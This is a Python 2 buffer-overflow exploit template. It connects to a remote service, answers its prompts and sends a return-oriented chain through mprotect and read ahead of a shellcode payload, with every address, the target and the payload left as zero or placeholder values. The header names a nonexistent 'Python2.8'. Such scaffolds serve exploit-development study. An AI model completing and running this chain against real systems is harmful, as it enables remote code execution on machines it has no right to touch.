#!/usr/bin/python

#################################
#  Buffer Overflow Template     #
#  Created by John Lavery       #
#  Year of 2017                 #
#  Written in Python2.8         #
#################################

# import libraries
import sys, socket, time
import struct

# declare function and classes
def p(x):
    return struct.pack('<L',x)

class Connect(object):

    def __init__(self, host, port):
        self.host = host
        self.port = port

    def connect(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print('connecting to host')
        sock.connect((self.host, self.port))
        return sock

    def send(self, command):
        sock = self.connect()
        recv_data = ""
        data = True

        print sock.recv(1040)
        sock.send('y\n')
        print sock.recv(1040)
        time.sleep(0.5)
        print sock.recv(1040)
        sock.send('y\n')
        print sock.recv(1040)
        time.sleep(2)
        print sock.recv(1040)
        time.sleep(0.5)
        print('sending: ' + command)
        print sock.recv(1040)
        sock.send(command)
        print sock.recv(1040)

        while True:
            if data == "": break
            data = sock.recv(1040)
            print data
        sock.close()
        return recv_data

# memory addresses for BoF payload

# Following variable values need to be changed
# based on memory location, shellcode, payload
# for now they have been replaced with "0"
# place holder

mprotect = 0x00000000
read = 0x00000000
rop3ret= 0x0000000

shellcode = "A"*0 

shellcode+= p(0x0000000) 

shellcode += p(mprotect)
shellcode += p(rop3ret)

payload =  "enter payload here"

shellcode+= p(0x00000000) 
shellcode+= p(0x0000000) 
shellcode+= p(0x0) 

shellcode+= p(read)
shellcode+= p(rop3ret)

shellcode+= p(0x0) 
shellcode+= p(0x00000000) 
shellcode+= p(0x000000)

shellcode+= p(0x00000)

shellcode+= payload

try:
    connect = Connect('<Enter your target here>', 'enter port#')
    connect.send(shellcode)
except Exception as e:
    print "An error occurred:", e

# EOF
